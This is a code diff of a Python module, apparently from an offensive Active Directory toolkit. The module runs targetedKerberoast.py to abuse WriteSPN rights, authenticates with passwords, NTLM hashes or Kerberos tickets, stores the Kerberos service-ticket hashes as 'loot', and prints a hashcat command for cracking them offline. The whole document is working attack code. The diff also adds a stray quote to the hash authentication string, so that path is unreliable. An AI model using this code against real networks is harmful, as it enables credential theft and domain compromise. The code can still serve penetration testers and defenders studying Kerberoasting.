@@ -1,28 +1,28 @@
 # modules/writespn.py
 
-import subprocess
 import os
 import re
 from core.colors import red, green, yellow, blue
-from core.helpers import run_command, save_loot
+from core.helpers import run_command, save_loot, select_from_list
 
 def attack_writespn(session):
+    print(blue("[*] Starting WriteSPN + Kerberoast via targetedKerberoast.py..."))
+
     tool_path = os.path.join("tools", "targetedKerberoast.py")
     if not os.path.exists(tool_path):
         print(red(f"[-] Tool not found: {tool_path}"))
-        print(yellow("[!] Please make sure 'targetedKerberoast.py' is in the 'tools/' directory."))
+        print(yellow("[!] Please place targetedKerberoast.py in the tools/ directory."))
         return
 
-    print(blue("[*] Launching targeted Kerberoast attack with SPN write..."))
+    output_file = "loot/Spn.hash"
 
     if session.hash:
-        auth = f"-u '{session.username}' -p :{session.hash}"
+        auth = f"-u '{session.username}' -p :{session.hash}'"
     elif session.password:
         auth = f"-u '{session.username}' -p '{session.password}'"
     else:
-        auth = f"-u '{session.username}' -k --no-pass --dc-ip {session.dc_ip} "
+        auth = f"-u '{session.username}' -k --no-pass --dc-ip {session.dc_ip}"
 
-    output_file = "loot/Spn.hash"
     cmd = (
         f"python3 {tool_path} -v -d '{session.domain}' {auth} "
         f"-f hashcat -o {output_file}"
@@ -32,19 +32,18 @@ def attack_writespn(session):
     combined = out + "\n" + err
 
     if not os.path.exists(output_file):
-        print(red("[-] No hash file created. SPN write or Kerberoast may have failed."))
+        print(red("[-] No hash file created. SPN write or roast may have failed."))
         print(combined)
         return
 
     with open(output_file, "r") as f:
         contents = f.read().strip()
 
-    # Check for at least one valid hash line
-    hash_found = any(re.search(r"\$krb5tgs\$.*", line) for line in contents.splitlines())
-    if hash_found:
-        print(green(f"[+] SPN write and Kerberoast successful. Hashes saved to {output_file}"))
+    if any("$krb5tgs$" in line for line in contents.splitlines()):
+        print(green(f"[+] SPN Kerberoast succeeded. Hash saved to: {output_file}"))
         save_loot("Spn.hash", contents)
+        print(blue("[*] Example crack command:"))
+        print(yellow("  hashcat -m 13100 -a 0 loot/Spn.hash /usr/share/wordlists/rockyou.txt"))
     else:
-        print(red("[-] SPN write may have succeeded, but no valid Kerberoast hashes found in output."))
-        print(yellow("[!] Check the output manually or rerun with debug flags."))
+        print(red("[-] No valid Kerberoast hashes found."))
         print(combined)
